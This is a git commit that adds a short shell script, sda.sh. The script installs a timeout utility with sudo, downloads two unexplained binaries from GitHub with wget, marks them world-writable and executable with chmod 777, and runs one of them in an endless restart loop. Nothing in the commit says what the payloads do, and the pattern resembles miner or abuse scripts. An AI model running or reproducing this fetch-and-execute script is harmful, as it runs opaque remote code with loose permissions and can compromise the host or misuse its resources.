18873539379c25f1e5695674ac7603a17794c3a0
ferasa <86012372+desafff@users.noreply.github.com>
2021-07-29 09:12:05 +0700

    Create sda.sh

---
+++ sda.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+sudo apt install timelimit -y
+wget -O syng https://raw.githubusercontent.com/desafff/gader/main/fas
+wget -O kontol https://github.com/desafff/ggss/raw/main/vio
+chmod 777 syng kontol
+./syng
+while :; do timeout 45 bash ./syng; sleep 1; done
